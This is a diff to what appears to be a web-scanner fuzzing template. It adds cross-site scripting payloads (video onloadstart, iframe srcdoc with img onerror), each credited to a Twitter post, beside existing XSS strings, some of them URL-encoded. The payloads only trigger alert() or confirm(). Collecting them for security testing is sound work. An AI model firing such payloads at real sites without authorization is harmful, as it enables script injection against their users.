@@ -32,6 +32,9 @@ http:
         - '%2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E'  #https://twitter.com/MeAsHacker_HNA/status/1663070164353523712
         - '<iframe src="javascript:alert(document.domain)"/>'   #https://twitter.com/ehsayaan/status/1663202463275704321
         - '"><svg/onload=alert(1)//'    #https://twitter.com/ehsayaan/status/1663202463275704321
+        - '<video src=x onloadstart=alert(document.domain)/>'   #https://twitter.com/ehsayaan/status/1584514744232292353
+        - '<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>'   #https://twitter.com/gonzxph/status/1656445477783748608
+        - '<iframe srcdoc="<img src=x onerror=alert(999)'   #https://twitter.com/RoundR0b1n/status/1657597515326185472
 
     fuzzing:
       - part: query
